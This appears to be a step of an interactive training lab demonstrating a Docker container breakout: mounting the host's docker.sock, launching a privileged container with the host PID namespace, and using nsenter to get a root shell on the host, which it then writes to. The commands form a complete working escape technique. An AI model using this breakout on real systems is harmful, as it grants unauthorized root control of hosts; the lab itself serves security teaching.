In this step you will walkthrough a container breakout example.

## Initial Container

Create a container based on debian and install the docker cli.

Check the current host `hostname`{{execute}}

> The output is `host01`, this shows that you are executing commands on the host used in this scenario.

Start the container `docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock debian:buster sh`{{execute}}

> The container is not running with any special privileges, it does mount the docker.sock from the host though. The **-it** flag starts the container interactively.

Check the current host `hostname`{{execute}}

> The output will be a 12 character hexidecimal string, this shows that you are executing commands within the container.

Install the pre-requisites required for the docker CLI

```
apt-get update && apt-get install -y \
  apt-transport-https \
  ca-certificates \
  curl \
  gnupg2 \
  libcurl4-openssl-dev \
  lsb-release
```{{execute}}

Install the docker CLI

```
curl -fsSL https://download.docker.com/linux/debian/gpg | gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg \
  && echo "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/debian $(lsb_release -cs) stable" | tee /etc/apt/sources.list.d/docker.list > /dev/null \
  && apt-get update \
  && apt-get install -y \
  docker-ce-cli
```{{execute}}

> Now you can execute docker commands from within the container.

## Privileged Container

List the running containers `docker ps`{{execute}}

> This shows that there is already one running container, it is the container you are executing the commands in.

Start another container `docker run --rm --privileged --pid=host -it debian:buster sh`{{execute}}

Check the hostname and current user `hostname; whoami`{{execute}}

> This shows that you are now executing in a different container as the root user. The container was started with the **--privileged** flag which grants all capabilities to the container, it also lifts all the limitations enforced by the device cgroup controller. In other words, the container can now do almost everything that the host can do. It also has the **--pid=host** flag which allows the container to use the process tree of the host.

Switch to the PID 1 isolation context and create a shell `nsenter -t 1 -m -u -n -i sh`{{execute}}

Check the hostname and current user again `hostname; whoami`{{execute}}

> You now have an interactive shell with root access on the host machine.

Create a file in the /bin directory on the host `echo "Houdini was here" >/bin/escaped`{{execute}}

Exit out of the interactive shell `exit`{{execute}}

Exit out of the privileged container `exit`{{execute}}

Exit out of the initial container `exit`{{execute}}

> You are now back on the host again.

## Compromised Host

Check the hostname `hostname`{{execute}}

Check the running containers `docker ps -a`{{execute}}

Check the file in the bin directory `cat /bin/escaped`{{execute}}

> In this step you have seen how unrestricted mounts and privileged containers could be exploited to give root privileges on the host. These security flaws are one of the reasons why Docker is no longer used as the container runtime in Kubernetes. It is also common to find policies that prevent running as root, running privileged containers or mounting from the host.